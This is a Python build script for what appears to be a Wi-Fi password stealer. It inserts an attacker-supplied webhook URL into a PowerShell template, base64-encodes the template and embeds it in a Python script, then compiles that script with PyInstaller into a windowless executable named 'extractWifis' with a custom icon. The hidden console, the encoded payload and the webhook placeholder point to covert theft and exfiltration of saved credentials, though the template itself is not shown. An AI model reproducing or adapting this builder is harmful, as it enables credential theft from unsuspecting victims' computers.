import subprocess
import sys
from base64 import b64encode
from re import sub

def build():
    if len(sys.argv) != 2:
        print(" Usage:\tpython3 build.py <webhook_url>")
        print("Bye...\n")
        sys.exit(1)

    hookurl = sys.argv[1]
    
    with open('template.ps1', 'r+') as file:
        content = file.read()
        new_content = sub('WEBHOOK_URL_HERE', hookurl, content)
        b64ps = b64encode(new_content.encode('utf16')[2:]).decode()

    with open('script.py', 'r+') as file:
        content = file.read()
        regex = r'(?<=b64 = ")[^"]*(?=")'
        new_content = sub(regex, b64ps, content)
        file.seek(0)
        file.write(new_content)
        file.truncate()
        
def compile():
    cmd = ['cmd', '/c' ,'pyinstaller', 'script.py', '--onefile', '--noconsole', '--icon', 'icon.ico', '--name', 'extractWifis', '--log-level', 'ERROR']
    subprocess.run(cmd,stdout=subprocess.DEVNULL)
    print("[+] Done!")

def main():
    build()
    compile()

if __name__ == "__main__":
    main()
